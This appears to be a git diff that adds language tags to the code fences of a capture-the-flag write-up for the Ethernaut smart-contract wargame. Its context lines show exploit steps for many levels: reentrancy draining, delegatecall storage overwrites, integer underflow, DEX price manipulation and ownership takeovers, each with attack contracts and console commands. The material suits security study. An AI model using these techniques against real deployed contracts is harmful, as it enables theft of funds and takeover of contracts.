@@ -3,7 +3,7 @@
 ## Commands Used
 
 ### 1. Called info() to get the initial clue
-```
+```js
 await contract.info()
 ```
 **Output:**  
@@ -14,7 +14,7 @@ This was the first hint given in the level.
 ---
 
 ### 2. Inspected the contract object
-```
+```js
 await contract
 ```
 To check what functions are available in the contract. I noticed a password() function.
@@ -22,7 +22,7 @@ To check what functions are available in the contract. I noticed a password() fu
 ---
 
 ### 3. Retrieved the password
-```
+```js
 await contract.password()
 ```
 **Output:**  
@@ -33,7 +33,7 @@ This is the password needed for authentication.
 ---
 
 ### 4. Submitted the password directly
-```
+```js
 await contract.authenticate(await contract.password())
 ```
 **Output:**  
@@ -62,7 +62,7 @@ Also, the initial owner starts with `1000 ether` in contributions, so our total 
 ## Commands Used
 
 ### 1. Contributed a small amount to initialize `contributions[msg.sender] > 0`
-```
+```js
 await contract.contribute({value: toWei("0.0005")})
 ```
 Enables the fallback function condition `contributions[msg.sender] > 0`.
@@ -70,7 +70,7 @@ Enables the fallback function condition `contributions[msg.sender] > 0`.
 ---
 
 ### 2. Sent ETH directly to the contract to trigger the fallback function
-```
+```js
 await web3.eth.sendTransaction({from: player, to: contract.address, value: web3.utils.toWei("0.0001", "ether")})
 ```
 This calls the `receive()` function, which sets me as the new `owner` since I already had a contribution.
@@ -78,7 +78,7 @@ This calls the `receive()` function, which sets me as the new `owner` since I al
 ---
 
 ### 3. Called `withdraw()` to drain the balance
-```
+```js
 await contract.withdraw()
 ```
 Now that I’m the owner, I can withdraw the contract’s balance and fulfill the final objective.
@@ -102,7 +102,7 @@ Now that I’m the owner, I can withdraw the contract’s balance and fulfill th
 ## Commands Used
 
 ### 1. Called the misnamed constructor to claim ownership
-```
+```js
 await contract.Fal1out()
 ```
 This allowed me to set myself as the owner of the contract, as it was not treated as a constructor but a regular public function.
@@ -110,7 +110,7 @@ This allowed me to set myself as the owner of the contract, as it was not treate
 ---
 
 ### 2. Verified ownership
-```
+```js
 await contract.owner()
 ```
 I got my address as the output, confirming that I am now the owner of the contract
@@ -135,7 +135,7 @@ In this challenge, the `CoinFlip` contract simulates a coin flip by using the pr
 ## Commands Used
 
 ### 1. Get the contract instance address
-```
+```js
 await contract.address
 ```
 This command was used to get the address of the deployed `CoinFlip` contract
@@ -143,7 +143,7 @@ This command was used to get the address of the deployed `CoinFlip` contract
 ---
 
 ### 2. Query the `consecutiveWins` after each successful guess
-```
+```js
 await contract.consecutiveWins()
 ```
 I used this command 10 times to check the `consecutiveWins` value after each flip. Each time the guess was correct, the value increased, and I confirmed that the counter reached 10.
@@ -170,7 +170,7 @@ In this challenge, the `Telephone` contract has a function `changeOwner()` that 
 ## Commands Used
 
 ### 1. Creating an Interface to Interact with the `Telephone` Contract
-```
+```solidity
 interface ITelephone {
   function changeOwner(address _owner) external;
 }
@@ -180,7 +180,7 @@ I created an interface (`ITelephone`) to interact with the `Telephone` contract.
 ---
 
 ### 2. Intermediate Contract to Exploit the Vulnerability
-```
+```solidity
 contract IntermediateContract {
   function changeOwner(address _addr) public {
     ITelephone(_addr).changeOwner(msg.sender);
@@ -202,7 +202,7 @@ After deploying both the `Telephone` contract and the `IntermediateContract` on 
 
 ### 4. **Query the ownership to confirm the change:**
 
-```
+```js
 await contract.owner()
 ```
 
@@ -222,7 +222,7 @@ await contract.owner()
 ## Commands Used
 
 ### 1. Get the contract instance
-```
+```js
 let instance = await contract;
 ```
 To interact with the deployed Token contract instance.
@@ -230,7 +230,7 @@ To interact with the deployed Token contract instance.
 ---
 
 ### 2. Called the `transfer` function with more than 20 tokens
-```
+```js
 await instance.transfer("0x0000000000000000000000000000000000000001", 21);
 ```
 This triggers the underflow vulnerability and results in a huge balance increase for the player.
@@ -238,7 +238,7 @@ This triggers the underflow vulnerability and results in a huge balance increase
 ---
 
 ### 3. Checked the player’s balance
-```
+```js
 (await instance.balanceOf(player)).toString();
 ```
 To verify that my token balance is now much larger than the original 20 tokens.
@@ -262,7 +262,7 @@ To verify that my token balance is now much larger than the original 20 tokens.
 ## Commands Used
 
 ### 1. Get the instance address
-```
+```js
 contract.address
 ```
 To confirm the deployed contract's address.
@@ -270,7 +270,7 @@ To confirm the deployed contract's address.
 ---
 
 ### 2. Set the instance variable to contract address
-```
+```js
 let instance = "0xinstance_address";
 ```
 To specify the instance we are attacking.
@@ -278,7 +278,7 @@ To specify the instance we are attacking.
 ---
 
 ### 3. Get the player’s account
-```
+```js
 let player = (await web3.eth.getAccounts())[0];
 ```
 To get the sender address (your player address).
@@ -286,7 +286,7 @@ To get the sender address (your player address).
 ---
 
 ### 4. Send the function selector of `pwn()` to the contract
-```
+```js
 await web3.eth.sendTransaction({
   from: player,
   to: instance,
@@ -298,7 +298,7 @@ await web3.eth.sendTransaction({
 ---
 
 ### 5. Check if ownership has changed
-```
+```js
 await contract.owner()
 ```
 To verify that the `owner` is now the player.
@@ -321,7 +321,7 @@ To verify that the `owner` is now the player.
 ## Commands Used
 
 ### 1. Create an attack contract with `selfdestruct`
-```
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -344,7 +344,7 @@ To give the contract some balance that it can push to the target via `selfdestru
 ---
 
 ### 3. Call the `destroy()` function with the Force instance address
-```
+```js
 await contract.destroy("0xD8b97663115cc3889479Eb5955E28F68025B2AD9")
 ```
 To execute `selfdestruct` and force ETH into the `Force` contract.
@@ -352,7 +352,7 @@ To execute `selfdestruct` and force ETH into the `Force` contract.
 ---
 
 ### 4. Confirm the contract balance is now greater than 0
-```
+```js
 await web3.eth.getBalance("0xD8b97663115cc3889479Eb5955E28F68025B2AD9")
 ```
 This confirms the ETH was successfully transferred and the level is complete.
@@ -374,7 +374,7 @@ This confirms the ETH was successfully transferred and the level is complete.
 ## Commands Used
 
 ### 1. Get the password from storage slot 1
-```
+```js
 await web3.eth.getStorageAt(instance, 1)
 ```
 The password is stored at slot 1. This reveals the raw `bytes32` value.
@@ -382,7 +382,7 @@ The password is stored at slot 1. This reveals the raw `bytes32` value.
 ---
 
 ### 2. Decode the password to readable ASCII
-```
+```js
 web3.utils.hexToAscii("0x...")  // Use the result from the previous step
 ```
 **Output**: `"A very strong secret password : )"`
@@ -390,7 +390,7 @@ web3.utils.hexToAscii("0x...")  // Use the result from the previous step
 ---
 
 ### 3. Convert the password back to bytes32 format
-```
+```js
 let password = web3.utils.asciiToHex("A very strong secret password : )");
 ```
 The contract's `unlock()` function expects a `bytes32` argument, so the string needs to be converted back.
@@ -398,14 +398,14 @@ The contract's `unlock()` function expects a `bytes32` argument, so the string n
 ---
 
 ### 4. Unlock the vault
-```
+```js
 await contract.unlock(password);
 ```
 
 ---
 
 ### 5. Check if the vault is unlocked
-```
+```js
 await contract.locked();
 ```
 **Output**: `false`
@@ -431,7 +431,7 @@ await contract.locked();
 ## Commands Used
 
 ### 1. Checked the current balance of the King contract
-```
+```js
 (await web3.eth.getBalance("0x72DF418D0D0F0A30625aB7F6cCE70eA7218b2168")).toString()
 ```
 I used this command to find the current `prize` amount, so I could send a higher amount and become the new king.
@@ -441,7 +441,7 @@ I used this command to find the current `prize` amount, so I could send a higher
 ---
 
 ### 2. Deployed the `KingAttack` contract
-```
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -470,7 +470,7 @@ I used the constructor to immediately send Ether to the King contract and claim 
 ---
 
 ### 3. Verified kingship
-```
+```js
 await contract._king();
 ```
 
@@ -500,7 +500,7 @@ I used this to confirm that my `KingAttack` contract had become the new king.
 
 I created a new file called `ReentranceAttack.sol` in Remix and pasted the following code:
 
-```
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.12;
 
@@ -562,7 +562,7 @@ contract ReentranceAttack {
 - The attack recursively called `withdraw()` through the fallback `receive()` function, draining the contract balance.
 
 To monitor the balance of the target contract, I ran:
-```
+```js
 (await web3.eth.getBalance(instance)).toString()
 ```
 Once the balance reached `0`, I confirmed the attack was successful.
@@ -590,7 +590,7 @@ Once the balance reached `0`, I confirmed the attack was successful.
   2. Returns `false` on the first call to `isLastFloor()`, and `true` on the second call — using a toggle variable.
 - **Outcome**: This tricks the `Elevator` into thinking it's not on the last floor, then immediately believing it is — allowing me to set `top = true` and complete the level.
 
-```
+```solidity
 // SPDX-License-Identifier: MIT 
 pragma solidity ^0.8.0;
 
@@ -649,7 +649,7 @@ contract ElevatorHack is Building {
 ### Verified the Result
 
 In the browser console, I checked:
-```
+```js
 await contract.top()
 ```
 **→ Output**: `true`
@@ -673,7 +673,7 @@ This confirmed that the Elevator believed it had reached the top.
 ## Commands Used
 
 ### 1. Read the value in storage slot 5
-```
+```js
 await web3.eth.getStorageAt(contract.address, 5)
 ```
 `data[2]` is stored in slot 5. I used this to retrieve the 32-byte value that contains the unlock key.
@@ -681,7 +681,7 @@ await web3.eth.getStorageAt(contract.address, 5)
 ---
 
 ### 2. Extract the unlock key from the retrieved bytes32
-```
+```js
 let full = '0xe29b4ed9fbfba303b84c498c7a45d399f864637ae28408665a60ce4592daf628';
 let key = '0x' + full.slice(2, 34);
 ```
@@ -690,7 +690,7 @@ I took the first 16 bytes from the `bytes32` value (i.e., 32 hex characters) to 
 ---
 
 ### 3. Unlock the contract
-```
+```js
 await contract.unlock(key);
 ```
 This call triggered the `unlock()` function and passed the correct key, changing `locked` to `false`.
@@ -698,7 +698,7 @@ This call triggered the `unlock()` function and passed the correct key, changing
 ---
 
 ### 4. Confirm that the contract was unlocked
-```
+```js
 await contract.locked();
 ```
 **Output**: `false`
@@ -730,7 +730,7 @@ This confirmed that the level was successfully completed.
 ## Commands Used
 
 ### 1. Deploy the attack contract
-```
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -760,7 +760,7 @@ This attack contract automates the solution to all three gates by constructing a
 ---
 
 ### 2. Call the attack function
-```
+```js
 await attacker.attack(contract.address)
 ```
 This executes the attack on the `GatekeeperOne` contract instance, attempting to register my address as the `entrant`.
@@ -768,7 +768,7 @@ This executes the attack on the `GatekeeperOne` contract instance, attempting to
 ---
 
 ### 3. Confirm level completion
-```
+```js
 await contract.entrant()
 ```
 **Output**: My wallet address (tx.origin)
@@ -804,7 +804,7 @@ If the value returned is the wallet address, then we've have successfully passed
 ## Commands Used
 
 ### 1. Attack Contract
-```
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -829,7 +829,7 @@ This contract satisfies all three gate conditions when deployed.
 ---
 
 ### 2. Check if level is solved
-```
+```js
 await contract.entrant()
 ```
 If it returns my wallet address, I successfully passed all gates and completed the level.
@@ -853,7 +853,7 @@ If it returns my wallet address, I successfully passed all gates and completed t
 ## Commands Used
 
 ### 1. Approve self to spend the full balance
-```
+```js
 await contract.approve(player, await contract.balanceOf(player))
 ```
 Grants the player permission to transfer their own tokens using `transferFrom()`.
@@ -861,7 +861,7 @@ Grants the player permission to transfer their own tokens using `transferFrom()`
 ---
 
 ### 2. Check allowance to confirm
-```
+```js
 (await contract.allowance(player, player)).toString()
 ```
 Verifies that the approval was successful and matches the token balance.
@@ -869,7 +869,7 @@ Verifies that the approval was successful and matches the token balance.
 ---
 
 ### 3. Use `transferFrom()` to bypass lock and move tokens
-```
+```js
 await contract.transferFrom(player, "0xYourAddress", await contract.balanceOf(player))
 ```
 This call is not gated by `lockTokens`, so it successfully transfers the full balance.
@@ -877,7 +877,7 @@ This call is not gated by `lockTokens`, so it successfully transfers the full ba
 ---
 
 ### 4. Confirm balance is 0
-```
+```js
 (await contract.balanceOf(player)).toString()
 ```
 If the balance is `0`, the level is successfully completed.
@@ -903,7 +903,7 @@ If the balance is `0`, the level is successfully completed.
 
 ### 1. Deploy the `Hack` contract in Remix
 
-```
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -936,7 +936,7 @@ This contract mimics the storage layout of `Preservation` and uses `delegatecall
 
 ### 2. Call `attack()` with the target `Preservation` contract address
 
-```
+```solidity
 hack.attack("0xPreservationContractAddress")
 ```
 
@@ -946,7 +946,7 @@ Executes the two-step overwrite of `timeZone1Library` and then `owner`.
 
 ### 3. Verify Ownership Change
 
-```
+```js
 await contract.owner()
 ```
 
@@ -973,7 +973,7 @@ await contract.owner()
 
 ### 1. Deploy the helper `Dev` contract in Remix
 
-```
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -996,7 +996,7 @@ This contract calculates the lost token contract address using Ethereum's `CREAT
 
 ### 2. Call `recover()` with the address of the `Recovery` contract
 
-```
+```solidity
 dev.recover("0xRecoveryContractAddress")
 ```
 
@@ -1008,7 +1008,7 @@ Get the address of the `SimpleToken` that was deployed via the `Recovery` contra
 
 Load the `SimpleToken` contract using the recovered address and call:
 
-```
+```solidity
 destroy(payable("yourWalletAddress"))
 ```
 
@@ -1083,7 +1083,7 @@ Final Init Code: `600a600c600039600a6000f3` (12 bytes)
 
 Open the browser console on the Ethernaut level page and paste:
 
-```
+```js
 // This is the raw bytecode of a minimal contract that returns 42 (0x2a) when called.
 const bytecode = "0x600a600c600039600a6000f3602a60505260206050f3";
 
@@ -1105,7 +1105,7 @@ The `MagicNum` level requires setting a contract that returns the value `42` usi
 
 ### 2. Set the Solver Address in MagicNum
 
-```
+```js
 await contract.setSolver(solverAddr);
 ```
 - This line explicitly sets the address of the deployed contract (which returns 42) as the `solver` expected by `MagicNum`.
@@ -1149,7 +1149,7 @@ await contract.setSolver(solverAddr);
 
 ### 1. I Enabled the Contacted Modifier
 
-```
+```js
 await contract.make_contact();
 ```
 
@@ -1159,7 +1159,7 @@ This set `contact = true`, so I could use `retract()` and `revise()`.
 
 ### 2. Caused an Array Underflow
 
-```
+```js
 await contract.retract();
 ```
 
@@ -1169,7 +1169,7 @@ This changed `codex.length` from 0 to `2^256 - 1`, making the array span all of 
 
 ### 3. Calculated the Slot Offset
 
-```
+```js
 const p = web3.utils.keccak256(web3.eth.abi.encodeParameters(["uint256"], [1]));
 // Output: '0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'
 
@@ -1183,7 +1183,7 @@ This index maps directly to storage slot `0`.
 
 ### 4. Prepared the Payload to Overwrite Owner
 
-```
+```js
 const content = '0x' + '0'.repeat(24) + player.slice(2);
 // Output: '0x000000000000000000000000<player_address>'
 ```
@@ -1194,7 +1194,7 @@ Padded my address with 12 bytes of `0x00` to form a 32-byte `bytes32` value.
 
 ### 5. Overwrote the Owner Variable
 
-```
+```js
 await contract.revise(i, content);
 ```
 
@@ -1204,7 +1204,7 @@ This wrote the padded player address into slot `0`, overwriting the contract's `
 
 ### Level Completed
 
-```
+```js
 await contract.owner() === player; // true
 ```
 
@@ -1228,7 +1228,7 @@ Verified ownership and submitted the instance.
 
 ## Vulnerability Summary
 
-```
+```solidity
 partner.call{value: amountToSend}(""); // No gas limit specified
 ```
 
@@ -1242,7 +1242,7 @@ partner.call{value: amountToSend}(""); // No gas limit specified
 
 ### 1. Deployed the GasBurner Contract
 
-```
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
@@ -1267,7 +1267,7 @@ contract GasBurner {
 
 ### 2. Set `GasBurner` as the Withdrawal Partner
 
-```
+```js
 await contract.setWithdrawPartner("<gas-burner-address>");
 ```
 
@@ -1298,7 +1298,7 @@ Submitted the instance, and the level was marked complete.
 
 ## Understanding the Flow
 
-```
+```solidity
 if (_buyer.price() >= price && !isSold) {
     isSold = true;
     price = _buyer.price();
@@ -1316,7 +1316,7 @@ if (_buyer.price() >= price && !isSold) {
 
 ### 1. Deployed a Custom `Buyer` Contract
 
-```
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.0;
 
@@ -1348,7 +1348,7 @@ contract Buyer {
 
 ### 2. Initiated the Purchase
 
-```
+```js
 await buyerContract.buyFromShop("<shop-instance-address>");
 ```
 
@@ -1359,7 +1359,7 @@ await buyerContract.buyFromShop("<shop-instance-address>");
 
 ### 3. Verified the Exploit
 
-```
+```js
 await contract.price().then(v => v.toString()); // Output: '0'
 await contract.isSold(); // Output: true
 ```
@@ -1383,7 +1383,7 @@ await contract.isSold(); // Output: true
 The Dex contract determines token swap prices based on a formula involving token reserves. However, due to **Solidity's integer division**, each swap introduces a **small imbalance** favoring the player. By repeatedly swapping tokens back and forth, we can exploit this **price manipulation vulnerability** to slowly increase our token balance relative to the Dex’s and eventually **drain all of one token**.
 
 The key vulnerability lies in:
-```
+```solidity
 function getSwapPrice(address from, address to, uint256 amount) public view returns (uint256) {
     return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
 }
@@ -1399,18 +1399,18 @@ Due to integer truncation, the swap price always rounds down—causing imbalance
    - Dex: 100 token1, 100 token2  
 
 2. **Approve Dex to spend our tokens:**
-```
+```js
 await contract.approve(contract.address, 500)
 ```
 
 3. **Get token addresses:**
-```
+```js
 let t1 = await contract.token1();
 let t2 = await contract.token2();
 ```
 
 4. **Execute swaps iteratively to drain token1:**
-```
+```js
 await contract.swap(t1, t2, 10)   // player: 0 t1, 20 t2
 await contract.swap(t2, t1, 20)   // player: 24 t1, 0 t2
 await contract.swap(t1, t2, 24)   // player: 0 t1, 30 t2
@@ -1420,7 +1420,7 @@ await contract.swap(t2, t1, 45)   // player: 110 t1, 20 t2
 ```
 
 5. **Verify token1 is drained from Dex:**
-```
+```js
 await contract.balanceOf(t1, instance).then(v => v.toString())
 // Output: '0'
 ```
@@ -1442,7 +1442,7 @@ We exploit this by creating our **own ERC-20 token (EvilToken)** and trick the D
 
 ### Vulnerability
 
-```
+```solidity
 function swap(address from, address to, uint256 amount) public {
     ...
     // No restriction that 'from' and 'to' must be token1/token2
@@ -1461,7 +1461,7 @@ This allows a **malicious token** to be used in swaps.
 
 Deploy the following contract in Remix or similar:
 
-```
+```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
@@ -1480,7 +1480,7 @@ Mint: `400` EVL to yourself (player).
 
 #### 2. Send 100 EVL to DexTwo
 
-```
+```js
 await evilToken.transfer(contract.address, 100);
 ```
 
@@ -1490,7 +1490,7 @@ This sets a 1:1 ratio between EVL and `token1` (and later `token2`).
 
 #### 3. Approve DexTwo to use 300 EVL
 
-```
+```js
 await evilToken.approve(contract.address, 300);
 ```
 
@@ -1498,7 +1498,7 @@ await evilToken.approve(contract.address, 300);
 
 #### 4. Check token addresses
 
-```
+```js
 const t1 = await contract.token1();
 const t2 = await contract.token2();
 const evl = evilToken.address;
@@ -1508,7 +1508,7 @@ const evl = evilToken.address;
 
 #### 5. Swap 100 EVL for `token1`
 
-```
+```js
 await contract.swap(evl, t1, 100);
 ```
 
@@ -1516,7 +1516,7 @@ Drains all 100 of `token1` from the DEX.
 
 Verify:
 
-```
+```js
 (await contract.balanceOf(t1, contract.address)).toString(); // should be '0'
 ```
 
@@ -1524,7 +1524,7 @@ Verify:
 
 #### 6. Swap 200 EVL for `token2`
 
-```
+```js
 await contract.swap(evl, t2, 200);
 ```
 
@@ -1532,7 +1532,7 @@ Drains all 100 of `token2` from the DEX.
 
 Verify:
 
-```
+```js
 (await contract.balanceOf(t2, contract.address)).toString(); // should be '0'
 ```
 
@@ -1584,7 +1584,7 @@ We begin by exploiting the `proposeNewAdmin()` method in **PuzzleProxy**. This m
 
 **Propose the player as the new admin**:
 
-```
+```js
 const functionSignature = {
     name: 'proposeNewAdmin',
     type: 'function',
@@ -1600,7 +1600,7 @@ await web3.eth.sendTransaction({ from: player, to: proxyAddress, data });
 
 At this point, the player is now the **owner** of the contract. We can verify this by checking the **owner** of PuzzleWallet:
 
-```
+```js
 await contract.owner() === player;  // Output: true
 ```
 
@@ -1610,7 +1610,7 @@ await contract.owner() === player;  // Output: true
 
 Now that the player is the **owner**, we can **whitelist** the player’s address to allow them to access the `onlyWhitelisted` functions:
 
-```
+```js
 await contract.addToWhitelist(player);
 ```
 
@@ -1624,7 +1624,7 @@ Before we can call `setMaxBalance()`, we need to **empty the contract's balance*
 
 1. **Check contract balance**:
 
-```
+```js
 await getBalance(contract.address);  // Output: 0.001 ETH
 ```
 
@@ -1632,7 +1632,7 @@ await getBalance(contract.address);  // Output: 0.001 ETH
 
 We need to call `deposit()` multiple times within the same transaction. However, `deposit()` can only be called **once** in a `multicall`. To bypass this, we can create a **nested multicall** structure.
 
-```
+```js
 // Deposit method data
 const depositData = await contract.methods["deposit()"].request().then(v => v.data);
 
@@ -1647,7 +1647,7 @@ Now, the **player’s balance** will be **0.002 ETH**, while the **contract’s 
 
 3. **Withdraw balance**:
 
-```
+```js
 await contract.execute(player, toWei('0.002'), 0x0);
 ```
 
@@ -1657,7 +1657,7 @@ await contract.execute(player, toWei('0.002'), 0x0);
 
 Now that we’ve drained the contract’s balance and **manipulated the accounting**, we can set the **maxBalance** to the player’s address, which will also set the **admin** to the player’s address.
 
-```
+```js
 await contract.setMaxBalance(player);
 ```
 
